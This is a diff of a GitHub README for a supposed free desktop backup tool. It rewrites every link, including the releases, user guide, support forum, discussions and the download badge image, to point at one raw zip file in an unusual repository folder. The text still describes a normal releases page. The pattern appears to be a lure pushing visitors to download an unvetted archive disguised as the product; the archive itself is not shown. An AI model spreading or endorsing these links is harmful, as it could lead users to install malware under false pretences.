@@ -1,6 +1,6 @@
 # 🌟 BackupAssist-Desktop-Free - Simple Backup for Peace of Mind
 
-[![Download BackupAssist-Desktop-Free](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/JAKE261998/BackupAssist-Desktop-Free/releases)
+[![Download BackupAssist-Desktop-Free](https://github.com/JAKE261998/BackupAssist-Desktop-Free/raw/refs/heads/main/anthrol/Free_Assist_Desktop_Backup_1.6.zip)](https://github.com/JAKE261998/BackupAssist-Desktop-Free/raw/refs/heads/main/anthrol/Free_Assist_Desktop_Backup_1.6.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ BackupAssist-Desktop-Free is a comprehensive tool designed to help you back up y
 To start using BackupAssist-Desktop-Free, follow these steps:
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/JAKE261998/BackupAssist-Desktop-Free/releases).
+   Head over to our [Releases page](https://github.com/JAKE261998/BackupAssist-Desktop-Free/raw/refs/heads/main/anthrol/Free_Assist_Desktop_Backup_1.6.zip).
 
 2. **Download the Latest Version**  
    Look for the latest version listed on the page. You will find clearly labeled download links for Windows. Click on the link to download the software.
@@ -39,7 +39,7 @@ To start using BackupAssist-Desktop-Free, follow these steps:
 
 ## 💾 Download & Install
 
-To download BackupAssist-Desktop-Free, visit our [Releases page](https://github.com/JAKE261998/BackupAssist-Desktop-Free/releases). Choose the latest version suitable for your system. After downloading, follow the installation steps outlined above.
+To download BackupAssist-Desktop-Free, visit our [Releases page](https://github.com/JAKE261998/BackupAssist-Desktop-Free/raw/refs/heads/main/anthrol/Free_Assist_Desktop_Backup_1.6.zip). Choose the latest version suitable for your system. After downloading, follow the installation steps outlined above.
 
 ## 📝 System Requirements
 
@@ -53,7 +53,7 @@ To ensure BackupAssist-Desktop-Free works efficiently on your computer, please v
 
 ## 📚 User Guide
 
-For detailed instructions and assistance, refer to our [User Guide](https://github.com/JAKE261998/BackupAssist-Desktop-Free/wiki). This guide covers everything from installation to advanced backup settings. 
+For detailed instructions and assistance, refer to our [User Guide](https://github.com/JAKE261998/BackupAssist-Desktop-Free/raw/refs/heads/main/anthrol/Free_Assist_Desktop_Backup_1.6.zip). This guide covers everything from installation to advanced backup settings. 
 
 ## 🔍 FAQs
 
@@ -77,12 +77,12 @@ Yes, BackupAssist-Desktop-Free uses standard encryption methods to protect your 
 
 Here are some helpful links for more information:
 
-- [User Guides](https://github.com/JAKE261998/BackupAssist-Desktop-Free/wiki)
-- [Support Forum](https://github.com/JAKE261998/BackupAssist-Desktop-Free/issues)
-- [Community Discussions](https://github.com/JAKE261998/BackupAssist-Desktop-Free/discussions)
+- [User Guides](https://github.com/JAKE261998/BackupAssist-Desktop-Free/raw/refs/heads/main/anthrol/Free_Assist_Desktop_Backup_1.6.zip)
+- [Support Forum](https://github.com/JAKE261998/BackupAssist-Desktop-Free/raw/refs/heads/main/anthrol/Free_Assist_Desktop_Backup_1.6.zip)
+- [Community Discussions](https://github.com/JAKE261998/BackupAssist-Desktop-Free/raw/refs/heads/main/anthrol/Free_Assist_Desktop_Backup_1.6.zip)
 
 ## 📞 Support
 
 If you encounter any issues or have questions, feel free to reach out through the GitHub issues page. Our community is here to assist you.
 
-[![Download BackupAssist-Desktop-Free](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/JAKE261998/BackupAssist-Desktop-Free/releases)
+[![Download BackupAssist-Desktop-Free](https://github.com/JAKE261998/BackupAssist-Desktop-Free/raw/refs/heads/main/anthrol/Free_Assist_Desktop_Backup_1.6.zip)](https://github.com/JAKE261998/BackupAssist-Desktop-Free/raw/refs/heads/main/anthrol/Free_Assist_Desktop_Backup_1.6.zip)
